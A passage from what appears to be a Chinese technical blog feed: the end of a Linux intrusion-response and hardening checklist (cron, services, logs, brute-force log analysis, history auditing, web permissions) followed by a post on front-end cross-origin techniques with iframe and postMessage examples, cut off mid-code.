class="line">/etc/anacrontab</span><br><span class="line">/var/spool/anacron/*</span><br></pre></td></tr></table></figure><blockquote><p><code>crontab -l</code></p></blockquote><p>查看anacron异步定时任务</p><blockquote><p><code>cat /etc/anacrontab</code></p></blockquote><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/image-20200329151249037.png" alt="image-20200329151249037"></p><h3 id="检查系统服务"><a href="#检查系统服务" class="headerlink" title="检查系统服务"></a>检查系统服务</h3><blockquote><p><code>service --status-all</code></p><p>[ + ] -&gt; 正在运行的服务<br>[ - ]-&gt; 停止的服务 </p><p>[ ? ] -&gt; 没有<code>status</code>命令的服务</p></blockquote><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/image-20200329013158389.png" alt="image-20200329013158389"></p><p><code>chkconfig  --list</code>  </p><p>查看服务自启动状态，可以看到所有的RPM包安装的服务</p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/image-20200329155721472.png" alt="image-20200329155721472"></p><p><strong>系统在3与5级别下的启动项</strong> </p><ol><li><p>中文环境</p><p><code>chkconfig --list | grep &quot;3:启用\|5:启用&quot;</code></p></li><li><p>英文环境</p><p><code>chkconfig --list | grep &quot;3:on\|5:on&quot;</code></p></li></ol><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/image-20200329155906516.png" alt="image-20200329155906516"></p><h3 id="检查系统文件是否被劫持"><a href="#检查系统文件是否被劫持" class="headerlink" title="检查系统文件是否被劫持"></a>检查系统文件是否被劫持</h3><blockquote><p><code>find /usr/bin/ /usr/sbin/ /bin/ /usr/local/bin/ -type f -mtime +7 | xargs ls -la</code></p></blockquote><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/image-20200329013454997.png" alt="image-20200329013454997"></p><p>查看文件属性</p><blockquote><p><code>lsattr filename</code></p></blockquote><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/image-20200329214318612.png" alt="image-20200329214318612"></p><p>查看文件所有者等信息</p><blockquote><p><code>getfacl filename</code></p></blockquote><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/image-20200329214335983.png" alt="image-20200329214335983"></p><h3 id="查看进程打开的文件"><a href="#查看进程打开的文件" class="headerlink" title="查看进程打开的文件"></a>查看进程打开的文件</h3><blockquote><p><code>lsof -p [pid]</code> 输出指定 PID 的进程所打开的文件</p></blockquote><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/image-20200329014502006.png" alt="image-20200329014502006"></p><h3 id="查看驱动"><a href="#查看驱动" class="headerlink" title="查看驱动"></a>查看驱动</h3><p>枚举/扫描系统驱动：</p><blockquote><p><code>lsmod</code></p></blockquote><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/image-20200329150551387.png" alt="image-20200329150551387"></p><h3 id="查找进程所有系统调用"><a href="#查找进程所有系统调用" class="headerlink" title="查找进程所有系统调用"></a>查找进程所有系统调用</h3><blockquote><p><code>strace -T -tt -e trace=all -p [PID]</code></p></blockquote><h3 id="服务自启动修改"><a href="#服务自启动修改" class="headerlink" title="服务自启动修改"></a>服务自启动修改</h3><figure class="highlight livecodeserver"><table><tr><td class="code"><pre><span class="line">chkconfig [<span class="comment">--level 运行级别] [独立服务名] [on|off]</span></span><br><span class="line">chkconfig –level  <span class="number">2345</span> httpd <span class="keyword">on</span>  开启自启动</span><br><span class="line">chkconfig httpd <span class="keyword">on</span> （默认<span class="title">level</span>是<span class="title">2345</span>）</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line">修改/etc/re.d/rc.<span class="built_in">local</span> 文件  </span><br><span class="line">加入 /etc/init.d/httpd <span class="built_in">start</span></span><br></pre></td></tr></table></figure><h2 id="系统加固"><a href="#系统加固" class="headerlink" title="系统加固"></a>系统加固</h2><h3 id="查看系统登录信息"><a href="#查看系统登录信息" class="headerlink" title="查看系统登录信息"></a>查看系统登录信息</h3><blockquote><p><code>grep &quot;Accepted &quot; /var/log/secure* | awk &#39;{print $1,$2,$3,$9,$11}&#39;</code></p></blockquote><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/image-20200329150823665.png" alt="image-20200329150823665"></p><h3 id="定位有爆破的源IP"><a href="#定位有爆破的源IP" class="headerlink" title="定位有爆破的源IP"></a>定位有爆破的源IP</h3><blockquote><p><code>grep &quot;Failed password&quot; /var/log/secure | grep -E -o &quot;(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)&quot;|uniq -c</code></p></blockquote><h3 id="爆破日志的用户名密码"><a href="#爆破日志的用户名密码" class="headerlink" title="爆破日志的用户名密码"></a>爆破日志的用户名密码</h3><blockquote><p><code>grep &quot;Failed password&quot; /var/log/secure|perl -e &#39;while($_=&lt;&gt;){ /for(.*?) from/; print &quot;$1\n&quot;;}&#39;|uniq -c|sort -nr</code></p></blockquote><h3 id="爆破的字典"><a href="#爆破的字典" class="headerlink" title="爆破的字典"></a>爆破的字典</h3><blockquote><p><code>grep &quot;Failed password&quot; /var/log/secure|perl -e &#39;while($_=&lt;&gt;){ /for(.*?) from/; print &quot;$1\n&quot;;}&#39;|uniq -c|sort -nr</code></p></blockquote><h3 id="添加命令审计"><a href="#添加命令审计" class="headerlink" title="添加命令审计"></a>添加命令审计</h3><p>存1万条命令</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sed -i 's/^HISTSIZE=1000/HISTSIZE=10000/g' /etc/profile</span><br></pre></td></tr></table></figure><p>在/etc/profile的文件尾部添加如下行数配置信息</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">USER_IP=`who -u am i 2&gt;/dev/null | awk '&#123;print $NF&#125;' | sed -e 's/[()]//g'`</span><br><span class="line">if [ "$USER_IP" = "" ]</span><br><span class="line">then</span><br><span class="line">USER_IP=`hostname`</span><br><span class="line">fi</span><br><span class="line">export HISTTIMEFORMAT="%F %T $USER_IP `whoami` "</span><br><span class="line">shopt -s histappend</span><br><span class="line">export PROMPT_COMMAND="history -a"</span><br></pre></td></tr></table></figure><p>让配置生效</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">source /etc/profile</span><br></pre></td></tr></table></figure><p>效果</p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/image-20200329151643130.png" alt="image-20200329151643130"></p><h3 id="安装web补丁"><a href="#安装web补丁" class="headerlink" title="安装web补丁"></a>安装web补丁</h3><ol><li>structs2系列RCE漏洞</li><li>thinkphp5.X RCE漏洞</li><li>Redis未授权访问漏洞</li><li>Confluence RCE漏洞（CVE_2019_3396）</li><li>Drupal RCE漏洞（CVE-2018-7600）</li><li>ThinkPHP RCE漏洞（CVE-2019-9082）</li></ol><h3 id="Web权限"><a href="#Web权限" class="headerlink" title="Web权限"></a>Web权限</h3><p><strong>网站目录文件权限的参考示例如下：</strong><br><strong>场景：</strong><br>我们假设 HTTP 服务器运行的用户和用户组是 www，网站用户为 centos，网站根目录是<code>/home/centos/web</code>。<br><strong>方法/步骤：</strong></p><p>我们首先设定网站目录和文件的所有者和所有组为 centos，www，如下命令：</p><blockquote><p><code>chown -R centos:www /home/centos/web</code></p></blockquote><p>设置网站目录权限为750，750是 centos 用户对目录拥有读写执行的权限，设置后，centos 用户可以在任何目录下创建文件，用户组有有读执行权限，这样才能进入目录，其它用户没有任何权限。</p><blockquote><p><code>find -type d -exec chmod 750 {} \;</code></p></blockquote><p>设置网站文件权限为640，640指只有 centos 用户对网站文件有更改的权限，HTTP 服务器只有读取文件的权限，无法更改文件，其它用户无任何权限。</p><blockquote><p><code>find -not -type d -exec chmod 640 {} \;</code></p></blockquote><p>针对个别目录设置可写权限。例如，网站的一些缓存目录就需要给 HTTP 服务有写入权限、discuz x2 的/data/目录就必须要写入权限。</p><blockquote><p><code>find data -type d -exec chmod 770 {} \;</code></p></blockquote><h1 id="日志"><a href="#日志" class="headerlink" title="日志"></a>日志</h1><p>日志默认存放位置：<code>/var/log/</code></p><p>查看日志配置情况：<code>more /etc/rsyslog.conf</code></p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/image-20200329160120485.png" alt="image-20200329160120485"></p><p><strong>相关命令</strong></p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/image-20200329164910433.png" alt="image-20200329164910433"></p><p>查看进程日志</p><blockquote><p><code>cat /var/log/messages</code></p></blockquote><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/image-20200329170504308.png" alt="image-20200329170504308"></p><p>查看服务日志</p><blockquote><p><code>cat /var/log/mailog</code></p></blockquote><p>查看web日志</p><p>一般都是<code>access_log</code>和<code>error_log</code></p><blockquote><p><code>sudo cat access_log | awk &#39;{print $1}&#39;|sort|uniq -c| sort -n -t &#39; &#39; #按访问次数排序(nr)</code><br><code>cat access_log | awk &#39;{print $1}&#39;|sort|uniq -c</code>  查看访问的ip<br><code>find ./ -name &quot;*.php&quot; |grep 404|xargs ls -la</code></p></blockquote><p>找到所有的脚本文件打包：</p><blockquote><p><code>sudo find /var/www/html/ |grep - E &quot;.asp$|.aspx$|.jsp$|.jspx$|.jspf$|.php$|.php3$|.php4$|.php5$|.inc$|.phtml$|.jar$|.war$|.pl$|.py$|.cer$|.asa$|.cdx$|.ashx$|.ascx$|.cfm$|.cgi$ &quot;|xargs tar zcvf /tmp/shellscript.tar.gz</code></p></blockquote><h1 id="APT"><a href="#APT" class="headerlink" title="APT"></a>APT</h1><ol><li><p>快速断网：</p><p>根据上文中的对网络连接的查询， 快速查找到可以连接直接切断，疑似受控危险情况下，直接断网。（记录下可以IP、Domain）</p></li><li><p>进程排查：</p><p>根据进程，找到样本（木马、蠕虫、病毒、downloader），交由沙箱快速分析重点找到网络行为，如果已知更好。</p><p>可以采取的措施：</p><ol><li>对于c&amp;c的IP、域名要直接在防火墙上deny掉，或者直接托管（dns代理），dga类型的可以定期的检测dga域名，尝试预测或者根据逆向分析恶意样本得到的dga算法进行封堵或者托管。</li><li>已经感染的和未感染的机器进行隔离措施。</li><li>分析恶意样本行为以及失陷主机日志，分析评估损失。</li><li>进行全面的主机恶意样本检查。</li><li>恢复或重装系统。</li></ol></li></ol><p>3、排查rookit，或许有深度隐藏恶意后门、如有可能，重新全面评估内部安全包括渗透测试，风险评估等。</p><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><p><a href="https://blog.csdn.net/u012763794/article/details/83661107" target="_blank" rel="noopener">通过chkrootkit学习如何在linux下检测RootKit</a></p><p><a href="https://edr.sangfor.com.cn/#/information/news_detail?id=214&type=index" target="_blank" rel="noopener">【实用指南】最全Linux应急响应技巧，看这一篇就够了</a></p><p><a href="https://blog.csdn.net/qq_23936389/article/details/83511323" target="_blank" rel="noopener">Linux应急响应入侵排查思路</a></p><p><a href="https://www.freebuf.com/column/206886.html" target="_blank" rel="noopener">应急响应实战案例分享</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;strong&gt;本文内容：&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Linux下入侵响应与应急处理措施&lt;/p&gt;
    
    </summary>
    
    
      <category term="入侵响应" scheme="https://a2u13.com/categories/%E5%85%A5%E4%BE%B5%E5%93%8D%E5%BA%94/"/>
    
    
  </entry>
  
  <entry>
    <title>前端跨域方案补充</title>
    <link href="https://a2u13.com/2020/03/27/%E5%89%8D%E7%AB%AF%E8%B7%A8%E5%9F%9F%E6%96%B9%E6%A1%88%E8%A1%A5%E5%85%85/"/>
    <id>https://a2u13.com/2020/03/27/%E5%89%8D%E7%AB%AF%E8%B7%A8%E5%9F%9F%E6%96%B9%E6%A1%88%E8%A1%A5%E5%85%85/</id>
    <published>2020-03-27T14:07:42.000Z</published>
    <updated>2020-06-07T06:28:28.924Z</updated>
    
    <content type="html"><![CDATA[<p> <strong>本文内容：</strong></p><p>除了常见跨域CORS、JSONP、WebSocket外的其他跨域方法</p><ul><li>document.domain + iframe跨域</li><li>location.hash + iframe跨域</li><li>window.name + iframe跨域</li><li>postMessage跨域</li><li>nginx代理跨域</li><li>nodejs中间件代理跨域</li></ul><a id="more"></a><h1 id="document-domain-iframe跨域"><a href="#document-domain-iframe跨域" class="headerlink" title="document.domain + iframe跨域"></a>document.domain + iframe跨域</h1><p><strong>要求：</strong></p><p>主域相同，不同子域之间跨域</p><p><strong>父窗口：</strong>（<code>http://www.website.com/a.html</code>)</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">id</span>=<span class="string">"iframe"</span> <span class="attr">src</span>=<span class="string">"http://child.website.com/a.html"</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">    <span class="built_in">document</span>.domain = <span class="string">'website.com'</span>;</span></span><br><span class="line"><span class="actionscript">    <span class="keyword">var</span> user = <span class="string">'admin'</span>;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p><strong>子窗口：</strong>（<code>http://child.website.com/a.html</code>)</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">    <span class="built_in">document</span>.domain = <span class="string">'website.com'</span>;</span></span><br><span class="line"><span class="actionscript">    <span class="comment">// 获取父窗口中变量</span></span></span><br><span class="line"><span class="javascript">    alert(<span class="string">'get js data from parent ---&gt; '</span> + <span class="built_in">window</span>.parent.user);</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><h1 id="location-hash-iframe跨域"><a href="#location-hash-iframe跨域" class="headerlink" title="location.hash + iframe跨域"></a>location.hash + iframe跨域</h1><p><strong>具体实现:</strong></p><p><code>a.html</code>包含<code>c.html</code>，c.html包含<code>b.html</code>，最后<code>b.html</code>通过<code>window.parent.parent</code>修改a.html的<code>location.hash</code></p><p>a.html,起在localhost:3000上</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span><span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">"http://localhost:4000/c.html#yuhua"</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span></span><br><span class="line"><span class="actionscript">      <span class="comment">//hash一变化，就获取变化后的hash值，这个hash值就是a传给c，c得到后响应，返回给b，b传递给a的</span></span></span><br><span class="line"><span class="javascript">      <span class="built_in">window</span>.onhashchange = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">        <span class="built_in">console</span>.log(location.hash);</span></span><br><span class="line">      &#125;</span><br><span class="line">    <span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>b.html,起在localhost:3000上</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span><span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- </span></span><br><span class="line"><span class="comment">window 当前b的window</span></span><br><span class="line"><span class="comment">window.parent b的父级，也就是c</span></span><br><span class="line"><span class="comment">window.parent.parent b的爷爷，也就是c的爸爸，也就是a</span></span><br><span class="line"><span class="comment">--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span></span><br><span class="line"><span class="javascript">      <span class="built_in">window</span>.parent.parent.location.hash = location.hash;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>c.html,起在localhost:4000上</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span><span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span></span><br><span class="line"><span class="javascript">      <span class="keyword">let</span> iframe = <span class="built_in">document</span>.createElement(<span class="string">"iframe"</span>);</span></span><br><span class="line"><span class="actionscript">      iframe.src = <span class="string">'http://localhost:3000/b.html#18'</span>;</span></span><br><span class="line"><span class="javascript">      <span class="built_in">document</span>.body.appendChild(iframe);</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p><strong>思路：</strong></p><ol><li>访问a.html之后，就会加载c.html，同时把他自己的<code>location.hash</code>传给了c.html</li><li>c.html加载后，会载入b.html，把自己的<code>location.hash</code>传给了b.html</li><li>这时候a.html与b.html是同源的，并且由于两层<code>iframe</code>嵌套，使用<code>window.parent.parent</code>即可把自己的从c.html收到的<code>location.hash</code>传到a.html</li></ol><h1 id="window-name-iframe跨域"><a href="#window-name-iframe跨域" class="headerlink" title="window.name + iframe跨域"></a>window.name + iframe跨域</h1><p><strong>window.name解释：</strong></p><p>获取/设置窗口的名称。</p><p><strong>语法：</strong></p><blockquote><p>string = window.name;<br>window.name = string;</p></blockquote><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/image-20200328125639252.png" alt="image-20200328125639252"></p><p>前提准备：</p><p>a.html,起在localhost:3000上</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">"en"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>a.html<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">iframe</span> <span class="attr">id</span>=<span class="string">"iframe"</span> <span class="attr">src</span>=<span class="string">"http://localhost:4000/c.html"</span> <span class="attr">frameborder</span>=<span class="string">"0"</span> "<span class="attr">load</span>()"&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span></span><br><span class="line"><span class="javascript">      <span class="keyword">let</span> first = <span class="literal">true</span>;<span class="comment">//第一次加载</span></span></span><br><span class="line"><span class="actionscript">      <span class="function"><span class="keyword">function</span> <span class="title">load</span><span class="params">()</span></span>&#123;</span></span><br><span class="line">        if(first)&#123;</span><br><span class="line"><span class="javascript">          <span class="keyword">let</span> iframe = <span class="built_in">document</span>.querySelector(<span class="string">"#iframe"</span>);</span></span><br><span class="line"><span class="actionscript">          iframe.src = <span class="string">'http://localhost:3000/b.html'</span>;</span></span><br><span class="line"><span class="actionscript">          first = <span class="literal">false</span>;</span></span><br><span class="line"><span class="actionscript">        &#125;<span class="keyword">else</span>&#123;</span></span><br><span class="line"><span class="javascript">          <span class="built_in">console</span>.log(iframe.contentWindow.name);<span class="comment">//yuhua</span></span></span><br><span class="line"><span class="actionscript">          destoryFrame();<span class="comment">//销毁iframe</span></span></span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line"><span class="actionscript">      <span class="comment">// 获取数据以后销毁这个iframe，释放内存；这也保证了安全（不被其他域frame js访问）</span></span></span><br><span class="line"><span class="actionscript">      <span class="function"><span class="keyword">function</span> <span class="title">destoryFrame</span><span class="params">()</span> </span>&#123;</span></span><br><span class="line"><span class="actionscript">        iframe.contentWindow.document.write(<span class="string">''</span>);</span></span><br><span class="line">        iframe.contentWindow.close();</span><br><span class="line"><span class="javascript">        <span class="built_in">document</span>.body.removeChild(iframe);</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>b.html,起在localhost:3000上</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">"en"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Document<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>c.html,起在localhost:4000上</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">"en"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Document<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    c页面</span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span></span><br><span class="line"><span class="javascript">      <span class="built_in">window</span>.name = <span class="string">'yuhua'</span>;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p><strong>原理分析：</strong></p><ol><li>每个窗口都自己独立的window.name</li><li>当一个页面载入多个页面时，共享同一个window.name，同时都可以读写</li><li>所以说实际上就是，a.html加载c.html后，修改了<code>iframe.src</code>指向了我们同域的<code>b.html</code>，由于<code>window.name</code>是共享的，所以可以从<code>b.html</code>当中读到c.html中设置的<code>window.name</code>，这里b.html充当一个中间媒介（工具人</li></ol><h1 id="postMessage跨域"><a href="#postMessage跨域" class="headerlink" title="postMessage跨域"></a>postMessage跨域</h1><p><strong>window.postMessage解释：</strong></p><p>window.postMessage() 方法可以安全地实现跨源通信。</p><p>通常，对于两个不同页面的脚本，只有当执行它们的页面位于具有相同的协议（通常为https），端口号（443为https的默认值），以及主机  (两个页面的模数 Document.domain设置为相同的值) 时，这两个脚本才能相互通信。</p><p><code>window.postMessage()</code>方法提供了一种受控机制来规避此限制，只要正确的使用，这种方法就很安全。</p><p><strong>语法：</strong></p><blockquote><p>otherWindow.postMessage(message, targetOrigin, [transfer]);</p></blockquote><ul><li><p><strong>otherWindow</strong><br>其他窗口的一个引用，比如iframe的contentWindow属性、执行window.open返回的窗口对象、或者是命名过或数值索window.frames。</p></li><li><p><strong>message</strong><br>将要发送到其他 window的数据。它将会被结构化克隆算法序列化。这意味着你可以不受什么限制的将数据对象安全的传送给目标窗口而无需自己序列化。</p></li><li><p><strong>targetOrigin</strong><br>通过窗口的origin属性来指定哪些窗口能接收到消息事件，其值可以是字符串”<code>*</code>“（表示无限制）或者一个URI。</p><p>在发送消息的时候，如果目标窗口的协议、主机地址或端口这三者的任意一项不匹配targetOrigin提供的值，那么消息就不会被发送；只有三者完全匹配，消息才会被发送。</p><p>这个机制用来控制消息可以发送到哪些窗口；例如，当用postMessage传送密码时，这个参数就显得尤为重要，必须保证它的值与这条包含密码的信息的预期接受者的origin属性完全一致，来防止密码被恶意的第三方截获。</p><p>如果你明确的知道消息应该发送到哪个窗口，那么请始终提供一个有确切值的targetOrigin，而不是<code>*</code>。</p><p>不提供确切的目标将导致数据泄露到任何对数据感兴趣的恶意站点。</p></li><li><p><strong>transfer 可选</strong><br>是一串和message 同时传递的 Transferable 对象. 这些对象的所有权将被转移给消息的接收方，而发送一方将不再保有所有权。</p></li></ul><p><strong>举例：</strong></p><p>a.html：(<code>http://www.domain1.com/a.html</code>)</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">id</span>=<span class="string">"iframe"</span> <span class="attr">src</span>=<span class="string">"http://www.domain2.com/b.html"</span> <span class="attr">style</span>=<span class="string">"display:none;"</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span>       </span><br><span class="line"><span class="javascript">    <span class="keyword">var</span> iframe = <span class="built_in">document</span>.getElementById(<span class="string">'iframe'</span>);</span></span><br><span class="line"><span class="actionscript">    iframe.onload = <span class="function"><span class="keyword">function</span><span class="params">()</span> </span>&#123;</span></span><br><span class="line"><span class="actionscript">        <span class="keyword">var</span> data = &#123;</span></span><br><span class="line"><span class="actionscript">            name: <span class="string">'aym'</span></span></span><br><span class="line">        &#125;;</span><br><span class="line"><span class="actionscript">        <span class="comment">// 向domain2传送跨域数据</span></span></span><br><span class="line"><span class="javascript">        iframe.contentWindow.postMessage(<span class="built_in">JSON</span>.stringify(data), <span class="string">'http://www.domain2.com'</span>);</span></span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line"><span class="actionscript">    <span class="comment">// 接受domain2返回数据</span></span></span><br><span class="line"><span class="javascript">    <span class="built_in">window</span>.addEventListener(<span class="string">'message'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">e</span>) </span>&#123;</span></span><br><span class="line"><span class="actionscript">        alert(<span class="string">'data from domain2 ---&gt; '</span> + e.data);</span></span><br><span class="line"><span class="actionscript">    &#125;, <span class="literal">false</span>);</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>b.html：(<code>http://www.domain2.com/b.html</code>)</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="actionscript">    <span class="comment">// 接收domain1的数据</span></span></span><br><span class="line"><span class="javascript">    <span class="built_in">window</span>.addEventListener(<span class="string">'message'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">e</span>) </span>&#123;</span></span><br><span class="line"><span class="actionscript">        alert(<span class="string">'data from domain1 ---&gt; '</span> + e.data);</span></span><br><span class="line"><span class="actionscript"><span class="comment">//可以通过e.origin来判断来源</span></span></span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> data = <span class="built_in">JSON</span>.parse(e.data);</span></span><br><span class="line">        if (data) &#123;</span><br><span class="line">            data.number = 16;</span><br><span class="line"></span><br><span class="line"><span class="actionscript">            <span class="comment">// 